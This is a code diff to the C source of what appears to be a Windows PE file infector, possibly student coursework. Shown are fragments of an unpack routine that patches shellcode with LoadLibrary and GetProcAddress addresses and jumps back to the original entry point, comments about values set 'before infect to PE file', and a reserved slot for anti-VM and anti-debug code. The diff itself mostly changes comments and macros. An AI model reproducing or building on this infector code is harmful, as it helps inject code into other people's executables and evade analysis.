@@ -1,4 +1,3 @@
-//#include "packer.h"
 #ifndef PACKER
 #define PACKER
 #include <windows.h>
@@ -10,6 +9,7 @@
 #include "code.h"
 
 #ifndef DLL_NAME
+#define DLL_NAME
 #define MSVCRT_DLL_NAME "msvcrt.dll"
 #define USER32_DLL_NAME "USER32.dll"
 #define KERNEL32_DLL_NAME "KERNEL32.dll"
@@ -46,6 +46,7 @@ int unpack(){
         "je RET + 5;"
     );
 
+    // These below values will be adjusted before infect to PE file
     UCHAR *StartOfShellCode = (UCHAR *) 0x1; 
     UINT SizeOfShellCode    = 0x2;
 
@@ -63,6 +64,7 @@ int unpack(){
     DWORD OldEntryPointVA = 0xc; 
     DWORD LoadLibraryVA   = 0xd; 
     DWORD GetProcVA       = 0xe;
+    // These above values will be adjusted before infect to PE file
 
     UCHAR *msvcrtdll  = MSVCRT_DLL_NAME; 
     UCHAR *kerneldll  = KERNEL32_DLL_NAME;
@@ -93,7 +95,7 @@ int unpack(){
     DWORD JmpVA          = (DWORD) BufferOfShellcode + PositionOfJmpInShellCode;
     long RelativeOfJmpAndOldEntryPoint = (long) OldEntryPointVA - JmpVA - 5;
 
-    // Put adjusted address to their memory
+    // Putting adjusted address into their memory
     memcpy_ptr(&BufferOfShellcode[PositionOfCallLoadLibInShellcode + 2], &LoadLibraryVA, 4);
     memcpy_ptr(&BufferOfShellcode[PositionOfCallGetProcInShellcode + 2], &GetProcVA, 4);
     memcpy_ptr(&BufferOfShellcode[PositionOfSetDLLNameInShellcode + 3], &DLLNameAddress, 4);
@@ -109,7 +111,7 @@ int unpack(){
 
     __asm__(
         "RET:"
-        "jmp 0x12345678;"
+        "jmp 0x12345678;" // Place hold jmp instruction
     );
     return 0;
 }
@@ -687,8 +689,8 @@ int pack(UCHAR *FileName, UCHAR *NewFileName, int Mode, char MesBoxVersion){
     ShellParam.PositionOfSetText       = POS_SET_TEXT_STABLE;
     ShellParam.PositionOfJmp           = POS_JMP_STABLE;
     ShellParam.PositionOfMesBoxVersion = POS_SET_MESBOX_VERSION_STABLE;
-    ShellParam.Caption = "Infected Code";
-    ShellParam.Text    = "17520074 - 17520467";
+    ShellParam.Caption = CAPTION_;
+    ShellParam.Text    = TEXT_;
 
     itoa(rand() * rand(), tmpOutFileName, 10);
     adjustShellCode(CurrentInputFileName, tmpOutFileName, Mode, MesBoxVersion, &ShellParam);
@@ -700,7 +702,7 @@ int pack(UCHAR *FileName, UCHAR *NewFileName, int Mode, char MesBoxVersion){
     UNPACK_CODE_PARAM UnpackParam;
     memset(&UnpackParam, 0, sizeof(SHELL_CODE_PARAM));
 
-    DWORD PlaceHoldForOtherCode = 22 + 15 + 33;
+    DWORD PlaceHoldForOtherCode = 22 + 15 + 33; // Anti-VM, Anti-Debug code
     UnpackParam.PosOfSetStartOfShellAddr = PlaceHoldForOtherCode +  9;
     UnpackParam.PosOfSetSizeOfShellAddr  = PlaceHoldForOtherCode + 16;
 
@@ -735,6 +737,7 @@ int pack(UCHAR *FileName, UCHAR *NewFileName, int Mode, char MesBoxVersion){
 
     return 0;
 }
+#endif
 
 int main(int argc, char *argv[]){
     char USAGE[0xff0];
@@ -813,5 +816,3 @@ int main(int argc, char *argv[]){
     printf("Done~~\n");
     return 0;
 }
-
-#endif
